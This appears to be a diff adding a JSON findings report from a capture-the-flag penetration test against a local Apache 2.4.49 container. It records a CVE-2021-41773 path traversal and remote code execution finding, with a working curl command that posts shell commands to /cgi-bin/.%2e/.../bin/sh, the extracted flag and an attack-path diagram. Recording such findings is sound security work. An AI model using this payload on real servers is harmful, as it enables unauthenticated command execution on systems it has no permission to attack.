@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:25:20.432172+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "1d9e9158-d7ad-421e-bc34-49c4766a45af",
+      "timestamp": "2026-04-12T21:25:20.432095+00:00",
+      "title": "CVE-2021-41773 Apache 2.4.49 Path Traversal + RCE \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35771",
+      "description": "Apache HTTP Server 2.4.49 is vulnerable to CVE-2021-41773, a path traversal and remote code execution vulnerability. The CGI module (mod_cgi) is enabled and allows execution of arbitrary commands via a crafted POST request to /cgi-bin/ with URL-encoded path traversal sequences (%2e). An unauthenticated attacker can execute arbitrary OS commands as the web server user.",
+      "evidence": "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh with body 'echo Content-Type: text/plain; echo; cat /tmp/flag' returned:\n\nflag{522200b1-5603-4ffd-bbdd-0b6a1db6cb2c}",
+      "tool_used": "curl (manual exploit)",
+      "cve": "CVE-2021-41773",
+      "reproduction": {
+        "type": "command",
+        "command": "curl --path-as-is -X POST 'http://172.17.0.1:35771/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; cat /tmp/flag'",
+        "expected": "flag{522200b1-5603-4ffd-bbdd-0b6a1db6cb2c}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "df6a37e0-34d1-4c3c-9e6d-fbd87bae3236",
+      "timestamp": "2026-04-12T21:25:29.856955+00:00",
+      "title": "Target Architecture - CVE-2021-41773 Attack Path",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] -->|\"POST /cgi-bin/.%2e/.../%2e/bin/sh\"| Apache[\"Apache 2.4.49 :35771\"]\n  Apache -->|\"mod_cgi executes /bin/sh\"| Shell[\"OS Shell (RCE)\"]\n  Shell -->|\"cat /tmp/flag\"| Flag[\"flag{522200b1-5603-4ffd-bbdd-0b6a1db6cb2c}\"]\n  Apache --- CGI[\"mod_cgi enabled\"]\n  Apache --- Vuln[\"CVE-2021-41773 Path Traversal\"]"
+    }
+  ]
+}
